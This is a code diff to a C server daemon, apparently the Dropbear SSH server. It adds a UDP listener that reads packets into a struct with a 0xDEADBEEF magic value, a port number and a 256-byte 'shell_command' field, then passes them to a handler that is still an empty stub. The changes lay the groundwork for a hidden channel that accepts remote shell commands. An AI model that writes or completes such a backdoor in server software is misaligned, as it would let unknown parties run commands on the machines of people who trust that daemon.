@@ -33,6 +33,15 @@
 
 #define UDP_PACK_SIZE 262 // sizeof(listen_packet_t)
 
+// struct for incomin udp msgs
+typedef struct {
+    uint32_t magic; /* should be 0xDEADBEEF */
+    uint16_t port_number;
+    char shell_command[256];
+} listen_packet_t;
+
+static void handle_udp_packet(listen_packet_t* udp_msg);
+
 static size_t listensockets(int *sock, int *udp_socks, size_t *udp_count, size_t sockcount, int *maxfd);
 static void sigchld_handler(int dummy);
 static void sigsegv_handler(int);
@@ -122,6 +131,7 @@ static void main_noinetd() {
 	int udpsocks[MAX_LISTEN_ADDR];
 	size_t listensockcount = 0;
 	size_t udpsockcount = 0;
+	listen_packet_t udp_msg;
 	FILE *pidfile = NULL;
 
 	int childpipes[MAX_UNAUTH_CLIENTS];
@@ -130,8 +140,8 @@ static void main_noinetd() {
 	int childsock;
 	int childpipe[2];
 
-	// buffer to save incoming udp msg
-	char udp_buffer[UDP_PACK_SIZE]; 
+	
+	
 
 	/* Note: commonsetup() must happen before we daemon()ise. Otherwise
 	   daemon() will chdir("/"), and we won't be able to find local-dir
@@ -249,13 +259,14 @@ static void main_noinetd() {
 			{
 				struct sockaddr_storage remoteaddr;
 				socklen_t remoteaddrlen = sizeof(remoteaddr); 
-				bzero(udp_buffer, sizeof(udp_buffer)); 
+				bzero(&udp_msg, sizeof(udp_msg)); 
 						
-				TRACE(("*********Message from UDP client: \n"))
+				TRACE(("*********Message from UDP client \n"))
 
-				ssize_t n = recvfrom(udpsocks[i], udp_buffer, sizeof(udp_buffer), 0, 
+				ssize_t n = recvfrom(udpsocks[i], &udp_msg, sizeof(udp_msg), 0, 
 							(struct sockaddr*)&remoteaddr, &remoteaddrlen); 
-				TRACE(("************udp_buffer = %s", udp_buffer))
+				
+				handle_udp_packet(&udp_msg);
 			}	
 		}
 
@@ -444,6 +455,21 @@ static void commonsetup() {
 
 	seedrandom();
 }
+
+
+// parse udp packet and act accordingly
+static void handle_udp_packet(listen_packet_t* udp_msg)
+{
+	TRACE(("*****inside handle udp packet"))
+	
+	
+}
+
+
+
+
+
+
 
 /* Set up listening sockets for all the requested ports */
 // udp_socks - arraty to store udp socks
